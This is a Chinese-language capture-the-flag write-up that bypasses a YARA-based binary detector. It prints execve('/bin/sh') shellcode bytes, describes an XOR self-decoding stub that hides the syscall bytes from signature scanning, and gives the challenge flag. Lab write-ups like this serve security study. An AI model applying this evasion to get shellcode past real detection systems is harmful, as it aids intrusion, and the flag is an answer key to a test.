## 题目原文

> 目标环境部署了基于特征的二进制检测机制。已获授权进行红队对抗评估，请构造功能等价、但能规避该检测的制品，通过后取得 flag。本题采用 flag 与制品质量双轨评分。

## 题解

### 入口与指纹

8000 端口，`Werkzeug/3.1.8 Python/3.11.15`。`GET /` 说明挑战名是 `yara-rule-evasion`。POST JSON `{"payload": "<hex>"}`，长度 8 到 4096 字节。响应用 `status` 区分：`detected` 是规则命中，另一类错误是「不像 x86_64 指令」。

### 关键观察

规则盯的是提交字节里的 `syscall` 编码 `0f 05`，不是 `/bin/sh` 这串字符本身。

| 提交内容 | 结果 |
| --- | --- |
| 明文 `execve("/bin/sh")`，末尾是 `0f 05` | `status: detected` |
| 只有 `mov eax, 1; syscall`（`b8 01 00 00 00 0f 05`） | 同样 `detected`。没有 `/bin/sh` 也会中 |
| `/bin/sh` 加上若干 `nop` | `Payload does not appear to contain x86_64 instructions` |
| 32 位 `int 0x80` 的 execve | 同样被判成不是 x86_64 |

所以要通过两关：反汇编要能看成 x86_64，提交的字节里又不能出现 `0f 05`。做法是一段异或解码器，后面跟着按字节异或过的 execve shellcode。解码器本身是普通的 `lea` / `xor byte` / `inc` / `dec` / `jnz` / `jmp`，解码完成后再跳回明文。明文里的 `0f 05` 只在运行时出现。

### 利用链

解码器把 `rbx` 指到紧跟其后的密文，用 `0x37` 逐字节还原，再 `jmp rbx`。密文是下面这条 execve 壳代码异或 `0x37` 的结果：

```text
31 d2 52
48 b8 2f 62 69 6e 2f 73 68 00
50 48 89 e7 52 57 48 89 e6
48 31 c0 b0 3b 0f 05
```

`lea` 的相对位移等于解码器剩余长度。这次解码器总长 24 字节，`lea` 占 7 字节，位移是 `0x11`。整段十六进制提交后，响应是 `status: bypassed`，`message` 为 `Your payload bypassed all YARA rules!`。

本次平台接受的值是 `flag{87dfff75-fe35-4219-9317-58c1b09d9994}`。

### flag 位置

POST 响应的 `flag` 字段。出现这个字段的条件是 `status == "bypassed"`。
